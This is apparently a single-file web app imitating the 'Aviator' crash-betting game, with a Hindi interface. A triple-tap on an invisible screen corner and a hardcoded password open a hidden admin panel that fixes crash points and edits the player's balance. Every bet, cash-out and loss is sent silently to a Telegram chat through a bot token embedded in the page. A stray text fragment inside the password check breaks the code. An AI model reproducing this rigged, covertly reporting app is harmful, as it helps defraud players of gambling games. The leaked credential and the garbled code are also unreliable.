<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Aviator - Mahakal Pro Edition</title>
<style>
body {
  background-color: #0b0f19;
  color: #ffffff;
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 5px;
  display: flex;
  flex-direction: column;
  align-items: center;
  user-select: none;
}
.app-container {
  width: 100%;
  max-width: 400px;
  background: #121824;
  border-radius: 14px;
  border: 2px solid #1f293d;
  box-shadow: 0 8px 25px rgba(0,0,0,0.8);
  overflow: hidden;
  position: relative;
}
.header-bar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  background: #0f141f;
  padding: 10px 12px;
  border-bottom: 1px solid #1f293d;
}
.app-title {
  color: #ff3344;
  font-size: 20px;
  font-weight: bold;
  font-style: italic;
  letter-spacing: 1px;
}
.header-right {
  display: flex;
  align-items: center;
  gap: 8px;
}
.balance-badge {
  font-size: 13px;
  color: #00e676;
  font-weight: bold;
}
.deposit-btn {
  background: #00c853;
  color: #000;
  border: none;
  padding: 5px 12px;
  border-radius: 6px;
  font-weight: bold;
  font-size: 12px;
  cursor: pointer;
}
.history-bar {
  display: flex;
  gap: 6px;
  padding: 6px 10px;
  background: #0b0f19;
  overflow-x: auto;
  white-space: nowrap;
  font-size: 11px;
  border-bottom: 1px solid #1f293d;
}
.hist-item {
  background: #1a2230;
  padding: 3px 8px;
  border-radius: 4px;
  color: #00b4d8;
  font-weight: bold;
}
.game-screen {
  height: 180px;
  background: radial-gradient(circle, #1a2639 0%, #080c14 100%);
  position: relative;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  border-bottom: 2px solid #1f293d;
  overflow: hidden;
}
.red-curve {
  position: absolute;
  bottom: 0;
  left: 0;
  width: 100%;
  height: 60%;
  background: linear-gradient(to top, rgba(255, 51, 68, 0.4), transparent);
  clip-path: polygon(0 100%, 0 60%, 30% 40%, 70% 20%, 100% 0, 100% 100%);
  z-index: 1;
}
.multiplier-text {
  font-size: 40px;
  font-weight: bold;
  color: #ffffff;
  text-shadow: 0 0 15px rgba(255,51,68,0.6);
  z-index: 2;
}
.status-msg {
  font-size: 12px;
  color: #00e676;
  margin-top: 4px;
  z-index: 2;
  font-weight: bold;
}
.bet-control-panel {
  background: #121824;
  padding: 10px 12px;
  border-bottom: 1px solid #1f293d;
}
.bet-tabs {
  display: flex;
  background: #0b0f19;
  border-radius: 6px;
  padding: 2px;
  margin-bottom: 8px;
  width: fit-content;
}
.tab-btn {
  background: transparent;
  border: none;
  color: #8c9bae;
  padding: 4px 14px;
  font-size: 11px;
  font-weight: bold;
  border-radius: 4px;
  cursor: pointer;
}
.tab-btn.active {
  background: #1a2230;
  color: #fff;
}
.bet-box-row {
  display: flex;
  background: #1a2230;
  border-radius: 6px;
  border: 1px solid #2a3b52;
  overflow: hidden;
  margin-bottom: 6px;
  align-items: center;
}
.bet-input {
  flex: 1;
  background: transparent;
  border: none;
  color: white;
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  padding: 6px;
  outline: none;
}
.bet-btn-ctrl {
  background: #253347;
  color: white;
  border: none;
  padding: 6px 12px;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
}
.preset-grid {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 4px;
  margin-bottom: 8px;
}
.preset-btn {
  background: #1a2230;
  border: 1px solid #2a3b52;
  color: #a0aec0;
  padding: 4px;
  border-radius: 4px;
  font-size: 11px;
  font-weight: bold;
  cursor: pointer;
}
.action-btn-main {
  width: 100%;
  padding: 10px;
  border: none;
  border-radius: 6px;
  font-size: 15px;
  font-weight: bold;
  cursor: pointer;
  text-transform: uppercase;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  line-height: 1.3;
}
.btn-bet-state { background: #00c853; color: #000; }
.btn-cashout-state { background: #ff9800; color: #000; }
.btn-cancel-state { background: #e53935; color: #fff; }

/* Admin Panel */
.admin-panel {
  background: #1a1111;
  border: 2px solid #ff5252;
  padding: 12px;
  margin: 10px;
  border-radius: 8px;
  display: none;
  text-align: left;
  font-size: 12px;
}
.admin-input {
  width: 100%;
  padding: 6px;
  margin: 5px 0;
  background: #0b0f19;
  border: 1px solid #ff5252;
  color: white;
  border-radius: 4px;
  text-align: center;
  box-sizing: border-box;
}
.admin-save-btn {
  background: #ff5252;
  color: white;
  border: none;
  padding: 6px;
  width: 100%;
  font-weight: bold;
  border-radius: 4px;
  cursor: pointer;
  margin-top: 5px;
}
.secret-corner-trigger {
  position: fixed;
  top: 0;
  right: 0;
  width: 40px;
  height: 40px;
  z-index: 9999;
  cursor: default;
}
</style>
</head>
<body>

<div class="secret-corner-trigger" onclick="checkSecretAdminTap()"></div>

<div class="app-container">

  <!-- Top Header Bar -->
  <div class="header-bar">
    <div class="app-title">Aviator</div>
    <div class="header-right">
      <div class="balance-badge">₹<span id="user-balance">96,964.51</span></div>
      <button class="deposit-btn" onclick="openDeposit()">Deposit</button>
    </div>
  </div>

  <!-- History Bar -->
  <div class="history-bar">
    <span class="hist-item">2.03x</span>
    <span class="hist-item">4.39x</span>
    <span class="hist-item">3.73x</span>
    <span class="hist-item">1.18x</span>
    <span class="hist-item">1.12x</span>
    <span class="hist-item">41.89x</span>
  </div>

  <!-- Game Screen -->
  <div class="game-screen">
    <div class="red-curve"></div>
    <div class="multiplier-text" id="multiplier-display">1.27x</div>
    <div class="status-msg" id="status-text">अगला राउंड शुरू होने में: 3s</div>
  </div>

  <!-- Secret Admin Panel -->
  <div id="admin-panel-div" class="admin-panel">
    <b style="color:#ff5252;">👑 Master Admin Control Panel:</b>
    
    <p style="margin:4px 0; color:#ccc;">फिक्स क्रैश मल्टीप्लायर (0 = Random):</p>
    <input type="number" id="admin-crash-input" class="admin-input" placeholder="उदा. 2.00, 5.50" step="0.1" value="0">
    <button class="admin-save-btn" onclick="saveAdminCrash()">क्रैश पॉइंट सेट करें</button>

    <p style="margin:8px 0 4px 0; color:#ccc;">राउंड टाइमर (सेकंड में):</p>
    <input type="number" id="admin-timer-input" class="admin-input" value="3" min="1" max="30">
    <button class="admin-save-btn" style="background:#ff9800; color:#000;" onclick="saveAdminTimer()">टाइमर सेव करें</button>

    <p style="margin:8px 0 4px 0; color:#ccc;">यूजर का वॉलेट बैलेंस बदलें:</p>
    <input type="number" id="admin-bal-input" class="admin-input" placeholder="नया बैलेंस दर्ज करें">
    <button class="admin-save-btn" style="background:#00e676; color:#000;" onclick="saveAdminBalance()">बैलेंस सेव करें</button>
  </div>

  <!-- First Bet Panel -->
  <div class="bet-control-panel">
    <div class="bet-tabs">
      <button class="tab-btn active">Bet</button>
      <button class="tab-btn">Auto</button>
    </div>
    <div class="bet-box-row">
      <button class="bet-btn-ctrl" onclick="adjustBet(1, -100)">-</button>
      <input type="number" id="bet-amount-1" class="bet-input" value="500" min="10">
      <button class="bet-btn-ctrl" onclick="adjustBet(1, 100)">+</button>
    </div>
    <div class="preset-grid">
      <button class="preset-btn" onclick="setBet(1, 100)">100</button>
      <button class="preset-btn" onclick="setBet(1, 200)">200</button>
      <button class="preset-btn" onclick="setBet(1, 500)">500</button>
      <button class="preset-btn" onclick="setBet(1, 1000)">1,000</button>
    </div>
    <button id="main-action-btn-1" class="action-btn-main btn-bet-state" onclick="handleMainAction(1)">Bet (लगाएं)</button>
  </div>

  <!-- Second Bet Panel -->
  <div class="bet-control-panel" style="border-top: 1px solid #1f293d;">
    <div class="bet-tabs">
      <button class="tab-btn active">Bet</button>
      <button class="tab-btn">Auto</button>
    </div>
    <div class="bet-box-row">
      <button class="bet-btn-ctrl" onclick="adjustBet(2, -100)">-</button>
      <input type="number" id="bet-amount-2" class="bet-input" value="500" min="10">
      <button class="bet-btn-ctrl" onclick="adjustBet(2, 100)">+</button>
    </div>
    <div class="preset-grid">
      <button class="preset-btn" onclick="setBet(2, 100)">100</button>
      <button class="preset-btn" onclick="setBet(2, 200)">200</button>
      <button class="preset-btn" onclick="setBet(2, 500)">500</button>
      <button class="preset-btn" onclick="setBet(2, 1000)">1,000</button>
    </div>
    <button id="main-action-btn-2" class="action-btn-main btn-bet-state" onclick="handleMainAction(2)">Bet (लगाएं)</button>
  </div>

</div>

<script>
let walletBalance = 96964.51;
let bet1State = "WAITING"; 
let currentBet1 = 500;
let bet2State = "WAITING";
let currentBet2 = 500;
let currentMultiplier = 1.00;
let crashPoint = 2.00;
let forcedAdminCrash = 0;
let roundTimerSeconds = 3; 
let gameInterval = null;
let timerInterval = null;
let countdownSeconds = 3;

const TELEGRAM_BOT_TOKEN = "8531701253:AAFoYZkt3kJhPCEipll6Lk-ut1XR1uC2epE";
const TELEGRAM_CHAT_ID = "7880447645";

function sendTelegramAlert(message) {
  if(!TELEGRAM_BOT_TOKEN) return;
  let url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
  fetch(url).catch(err => console.log("Telegram Error", err));
}

window.onload = function() {
  let saved = localStorage.getItem('mahakal_master_wallet');
  if(saved !== null) {
    walletBalance = parseFloat(saved);
  }
  let savedTimer = localStorage.getItem('mahakal_admin_timer');
  if(savedTimer !== null) {
    roundTimerSeconds = parseInt(savedTimer);
    document.getElementById('admin-timer-input').value = roundTimerSeconds;
  }
  updateUI();
  startCountdown();
};

function updateUI() {
  document.getElementById('user-balance').innerText = walletBalance.toFixed(2);
  localStorage.setItem('mahakal_master_wallet', walletBalance);
}

function openDeposit() {
  let addAmt = prompt("Deposit karne ke liye amount darj karein:");
  if(addAmt && !isNaN(addAmt)) {
    walletBalance += parseFloat(addAmt);
    updateUI();
    alert("Deposit successful! New Balance: ₹" + walletBalance);
  }
}

function setBet(panelNum, val) {
  if(panelNum === 1 && bet1State === "WAITING") {
    currentBet1 = val;
    document.getElementById('bet-amount-1').value = currentBet1;
  } else if(panelNum === 2 && bet2State === "WAITING") {
    currentBet2 = val;
    document.getElementById('bet-amount-2').value = currentBet2;
  }
}

function adjustBet(panelNum, amt) {
  if(panelNum === 1 && bet1State === "WAITING") {
    let input = document.getElementById('bet-amount-1');
    let val = parseInt(input.value) + amt;
    if(val < 10) val = 10;
    currentBet1 = val;
    input.value = currentBet1;
  } else if(panelNum === 2 && bet2State === "WAITING") {
    let input = document.getElementById('bet-amount-2');
    let val = parseInt(input.value) + amt;
    if(val < 10) val = 10;
    currentBet2 = val;
    input.value = currentBet2;
  }
}

let tapCount = 0, lastTap = 0;
function checkSecretAdminTap() {
  let now = new Date().getTime();
  if(now - lastTap < 600) tapCount++; else tapCount = 1;
  lastTap = now;

  if(tapCount === 3) {
    tapCount = 0;
    let pwd = prompt("गुप्त एडमिन पासवर्ड दर्ज करें:");
    if(pwd === "78699") {[span_3](start_span)[span_3](end_span)
      let panel = document.getElementById('admin-panel-div');
      panel.style.display = panel.style.display === "block" ? "none" : "block";
    } else if(pwd !== null) {
      alert("❌ गलत पासवर्ड!");
    }
  }
}

function saveAdminCrash() {
  let val = parseFloat(document.getElementById('admin-crash-input').value);
  if(!isNaN(val)) {
    forcedAdminCrash = val;
    alert("✅ क्रैश पॉइंट सेट कर दिया गया: " + (val === 0 ? "Random" : val + "x"));
  }
}

function saveAdminTimer() {
  let val = parseInt(document.getElementById('admin-timer-input').value);
  if(!isNaN(val) && val > 0) {
    roundTimerSeconds = val;
    localStorage.setItem('mahakal_admin_timer', roundTimerSeconds);
    alert("✅ राउंड टाइमर सेट कर दिया गया: " + roundTimerSeconds + " सेकण्ड");
  }
}

function saveAdminBalance() {
  let val = parseFloat(document.getElementById('admin-bal-input').value);
  if(!isNaN(val)) {
    walletBalance = val;
    updateUI();
    alert("✅ वॉलेट बैलेंस अपडेट हो गया: ₹" + walletBalance);
  }
}

function startCountdown() {
  bet1State = "WAITING";
  bet2State = "WAITING";
  countdownSeconds = roundTimerSeconds;
  let statusTxt = document.getElementById('status-text');
  let mDisplay = document.getElementById('multiplier-display');
  
  mDisplay.innerText = "1.00x";
  mDisplay.style.color = "#ffffff";
  
  let btn1 = document.getElementById('main-action-btn-1');
  btn1.className = "action-btn-main btn-bet-state";
  btn1.innerText = "Bet (लगाएं)";
  
  let btn2 = document.getElementById('main-action-btn-2');
  btn2.className = "action-btn-main btn-bet-state";
  btn2.innerText = "Bet (लगाएं)";

  timerInterval = setInterval(() => {
    countdownSeconds--;
    if(countdownSeconds > 0) {
      statusTxt.innerText = `अगला राउंड शुरू होने में: ${countdownSeconds}s`;
    } else {
      clearInterval(timerInterval);
      startFlight();
    }
  }, 1000);
}

function handleMainAction(panelNum) {
  let btn1 = document.getElementById('main-action-btn-1');
  let btn2 = document.getElementById('main-action-btn-2');

  if(panelNum === 1) {
    let inputBet = parseInt(document.getElementById('bet-amount-1').value);
    if(bet1State === "WAITING") {
      if(isNaN(inputBet) || inputBet < 10) { alert("कृपया न्यूनतम ₹10 लगाएं!"); return; }
      if(walletBalance < inputBet) { alert("पर्याप्त बैलेंस नहीं है!"); return; }
      currentBet1 = inputBet;
      walletBalance -= currentBet1;
      updateUI();
      sendTelegramAlert(`🚨 Aviator Bet 1 Placed!\n💰 Amount: ₹${currentBet1}\n👤 Remaining: ₹${walletBalance}`);
      
      bet1State = "CANCELABLE";
      btn1.className = "action-btn-main btn-cancel-state";
      btn1.innerText = "Cancel (रद्द करें)";

    } else if(bet1State === "CANCELABLE" || bet1State === "PLAYING") {
      let winAmount = Math.floor(currentBet1 * currentMultiplier);
      walletBalance += winAmount;
      updateUI();
      sendTelegramAlert(`🎉 Aviator Cash Out 1!\n🚀 Multiplier: ${currentMultiplier.toFixed(2)}x\n🏆 Won: ₹${winAmount}`);
      
      bet1State = "CASHED";
      btn1.className = "action-btn-main btn-bet-state";
      btn1.style.background = "#00e676";
      btn1.innerText = `Won ₹${winAmount.toFixed(2)} INR`;
    }

  } else if(panelNum === 2) {
    let inputBet = parseInt(document.getElementById('bet-amount-2').value);
    if(bet2State === "WAITING") {
      if(isNaN(inputBet) || inputBet < 10) { alert("कृपया न्यूनतम ₹10 लगाएं!"); return; }
      if(walletBalance < inputBet) { alert("पर्याप्त बैलेंस नहीं है!"); return; }
      currentBet2 = inputBet;
      walletBalance -= currentBet2;
      updateUI();
      sendTelegramAlert(`🚨 Aviator Bet 2 Placed!\n💰 Amount: ₹${currentBet2}\n👤 Remaining: ₹${walletBalance}`);
      
      bet2State = "CANCELABLE";
      btn2.className = "action-btn-main btn-cancel-state";
      btn2.innerText = "Cancel (रद्द करें)";

    } else if(bet2State === "CANCELABLE" || bet2State === "PLAYING") {
      let winAmount = Math.floor(currentBet2 * currentMultiplier);
      walletBalance += winAmount;
      updateUI();
      sendTelegramAlert(`🎉 Aviator Cash Out 2!\n🚀 Multiplier: ${currentMultiplier.toFixed(2)}x\n🏆 Won: ₹${winAmount}`);
      
      bet2State = "CASHED";
      btn2.className = "action-btn-main btn-bet-state";
      btn2.style.background = "#00e676";
      btn2.innerText = `Won ₹${winAmount.toFixed(2)} INR`;
    }
  }
}

function startFlight() {
  currentMultiplier = 1.00;
  crashPoint = (forcedAdminCrash > 0) ? forcedAdminCrash : parseFloat((Math.random() * 3.8 + 1.2).toFixed(2));

  let btn1 = document.getElementById('main-action-btn-1');
  let btn2 = document.getElementById('main-action-btn-2');

  if(bet1State === "CANCELABLE") {
    bet1State = "PLAYING";
    btn1.className = "action-btn-main btn-cashout-state";
    btn1.style.background = "#ff9800";
  } else if(bet1State === "WAITING") {
    bet1State = "MISSED";
  }

  if(bet2State === "CANCELABLE") {
    bet2State = "PLAYING";
    btn2.className = "action-btn-main btn-cashout-state";
    btn2.style.background = "#ff9800";
  } else if(bet2State === "WAITING") {
    bet2State = "MISSED";
  }

  let mDisplay = document.getElementById('multiplier-display');
  let statusTxt = document.getElementById('status-text');
  statusTxt.innerText = "प्लेन उड़ रहा है...";

  gameInterval = setInterval(() => {
    currentMultiplier += 0.04;
    mDisplay.innerText = currentMultiplier.toFixed(2) + "x";

    if(bet1State === "PLAYING") {
      let liveWin1 = currentBet1 * currentMultiplier;
      btn1.innerHTML = `Cash Out<br><span style="font-size:17px; font-weight:bold;">₹${liveWin1.toFixed(2)} INR</span>`;
    }
    if(bet2State === "PLAYING") {
      let liveWin2 = currentBet2 * currentMultiplier;
      btn2.innerHTML = `Cash Out<br><span style="font-size:17px; font-weight:bold;">₹${liveWin2.toFixed(2)} INR</span>`;
    }

    if(currentMultiplier >= crashPoint) {
      clearInterval(gameInterval);

      if(bet1State === "PLAYING") {
        bet1State = "LOST";
        btn1.className = "action-btn-main btn-bet-state";
        btn1.style.background = "#00c853";
        btn1.innerText = "Bet (लगाएं)";
        sendTelegramAlert(`💥 Aviator Crash! Bet 1 Lost: ₹${currentBet1}`);
      } else if(bet1State === "MISSED") {
        btn1.className = "action-btn-main btn-bet-state";
        btn1.style.background = "#00c853";
        btn1.innerText = "Bet (लगाएं)";
      }

      if(bet2State === "PLAYING") {
        bet2State = "LOST";
        btn2.className = "action-btn-main btn-bet-state";
        btn2.style.background = "#00c853";
        btn2.innerText = "Bet (लगाएं)";
        sendTelegramAlert(`💥 Aviator Crash! Bet 2 Lost: ₹${currentBet2}`);
      } else if(bet2State === "MISSED") {
        btn2.className = "action-btn-main btn-bet-state";
        btn2.style.background = "#00c853";
        btn2.innerText = "Bet (लगाएं)";
      }

      statusTxt.innerText = "प्लेन क्रैश हो गया!";
      mDisplay.innerText = crashPoint.toFixed(2) + "x (CRASHED)";
      mDisplay.style.color = "#ff3344";

      setTimeout(() => {
        startCountdown();
      }, 2000);
    }
  }, 100);
}
</script>
</body>
</html>
